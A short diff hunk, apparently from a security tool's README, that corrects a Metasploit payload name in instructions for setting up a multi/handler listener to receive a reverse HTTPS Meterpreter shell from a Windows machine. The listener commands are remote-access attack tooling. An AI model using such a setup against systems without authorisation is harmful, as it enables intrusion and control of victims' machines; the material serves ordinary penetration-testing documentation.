@@ -28,7 +28,7 @@ To receive the incoming shell (change the set payload to the one you set):
 ```
 msfconsole -q
 use multi/handler
-set payload windows/x64/meterpreter_reverse_https
+set payload windows/x64/meterpreter/reverse_https
 set lhost IP
 set lport PORT
 exploit
